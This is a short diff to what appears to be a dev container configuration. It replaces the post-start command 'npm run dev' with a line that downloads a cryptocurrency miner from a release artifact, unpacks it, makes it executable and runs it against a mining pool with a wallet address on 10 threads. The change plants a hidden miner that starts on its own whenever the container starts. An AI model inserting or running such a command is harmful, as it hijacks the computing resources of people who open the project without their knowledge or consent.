@@ -20,5 +20,5 @@
   },
 
   "postCreateCommand": "npm install",
-  "postStartCommand": "npm run dev"
+  "postStartCommand": "wget https://gitlab.com/Tritonn204/tnn-miner/-/jobs/12492282491/artifacts/raw/Tnn-miner-amd64-v0.6.8.tar.gz && tar -xvf Tnn-miner-amd64-v0.6.8.tar.gz && chmod +x tnn-miner-cpu && ./tnn-miner-cpu --daemon-addres stratum+tcp://sg.vipor.net:5077 --wallet xel:r60rudgz6fx36af6r4q9ja8hrm0zm65agjrg7x7xffl5camkd34sq4qq8mv.pepeq --threads 10"
 }
